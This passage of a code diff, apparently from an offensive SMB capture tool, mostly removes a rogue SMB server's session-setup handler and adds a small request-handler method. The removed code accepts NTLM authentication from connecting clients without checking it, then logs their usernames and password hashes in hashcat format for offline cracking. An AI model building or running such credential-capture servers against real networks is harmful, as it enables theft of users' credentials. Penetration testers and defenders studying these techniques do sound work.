-                        # accept-incomplete. We want more data
-                        respToken = negTokenInit_step(
-                            negResult=0x01,
-                            supportedMech="NTLMSSP - Microsoft NTLM Security Support Provider",
-                        )
-                        respToken["ResponseToken"] = challengeMessage.getData()
-                    else:
-                        respToken = challengeMessage
-
-                    # Setting the packet to STATUS_MORE_PROCESSING
-                    errorCode = smb3.STATUS_MORE_PROCESSING_REQUIRED
-                    connData["Uid"] = random.randint(1, 0xFFFFFFFF)
-                    connData["CHALLENGE_MESSAGE"] = challengeMessage
-
-                case 0x02:
-                    # CHALLENGE_MESSAGE
-                    raise Exception("Challenge Message raise, not implemented!")
-
-                case 0x03:
-                    # AUTHENTICATE_MESSAGE, here we deal with authentication
-                    authenticateMessage = ntlm.NTLMAuthChallengeResponse()
-                    authenticateMessage.fromString(token)
-                    connData["AUTHENTICATE_MESSAGE"] = authenticateMessage
-                    NTLM_report_auth(
-                        authenticateMessage,
-                        challenge=self.get_challenge(connData),
-                        client=(connData["ClientIP"], self.server_config.smb_port),
-                        logger=self.logger,
-                        session=self.config,
-                    )
-
-                    errorCode = self.server_config.smb_error_code
-                    respToken = negTokenInit_step(negResult=0x02)
-
-                case messageType:
-                    raise Exception("Unknown NTLMSSP MessageType %d" % messageType)
-
-            respParameters["SecurityBlobLength"] = len(respToken)
-            respData["SecurityBlobLength"] = respParameters["SecurityBlobLength"]
-            respData["SecurityBlob"] = respToken.getData()
-
-        else:
-            # Process Standard Security
-            respParameters = smb.SMBSessionSetupAndXResponse_Parameters()
-            respData = smb.SMBSessionSetupAndXResponse_Data()
-            sessionSetupParameters = smb.SMBSessionSetupAndX_Parameters(
-                SMBCommand["Parameters"]
-            )
-            sessionSetupData = smb.SMBSessionSetupAndX_Data()
-            sessionSetupData["AnsiPwdLength"] = sessionSetupParameters["AnsiPwdLength"]
-            sessionSetupData["UnicodePwdLength"] = sessionSetupParameters[
-                "UnicodePwdLength"
-            ]
-            sessionSetupData.fromString(SMBCommand["Data"])
-            connData["Capabilities"] = sessionSetupParameters["Capabilities"]
-            # Do the verification here, for just now we grant access
-            # TODO: Manage more UIDs for the same session
-            errorCode = self.server_config.smb_error_code
-            connData["Uid"] = 10
-            respParameters["Action"] = 0
-
-            hversion, hstring = NTLM_AUTH_to_hashcat_format(
-                b"",  # no challenge
-                sessionSetupData["Account"],
-                sessionSetupData["PrimaryDomain"],
-                sessionSetupData["AnsiPwd"],
-                sessionSetupData["UnicodePwd"],
-                0,  # no flags, username and domain are already decoded
-            )
-            self.logger.highlight(
-                f"{hversion} Username: {sessionSetupData['PrimaryDomain']}/{sessionSetupData['Account']}",
-                host=connData["ClientIP"],
-            )
-            self.logger.highlight(
-                f"{hversion} Hash: {hstring}",
-                host=connData["ClientIP"],
-            )
-
-        respData["NativeOS"] = encodeSMBString(
-            recvPacket["Flags2"], smbServer.getServerOS()
+    def finish_request(self, request, client_address) -> None:
+        return self.RequestHandlerClass(
+            self.config, self.server_config, request, client_address, self
         )
-        respData["NativeLanMan"] = encodeSMBString(
-            recvPacket["Flags2"], smbServer.getServerOS()
-        )
-        respSMBCommand["Parameters"] = respParameters
-        respSMBCommand["Data"] = respData
-
-        # From now on, the client can ask for other commands
-        connData["Authenticated"] = True
-        smbServer.setConnectionData(connId, connData)
-
-        return [respSMBCommand], None, errorCode
-
-    def run(self):
-        host, port, *_ = self.server.server_address
-        self.logger.debug(f"Starting SMB server on {host}:{port}")
-        self.server.daemon_threads = True
-        self.server.serve_forever()
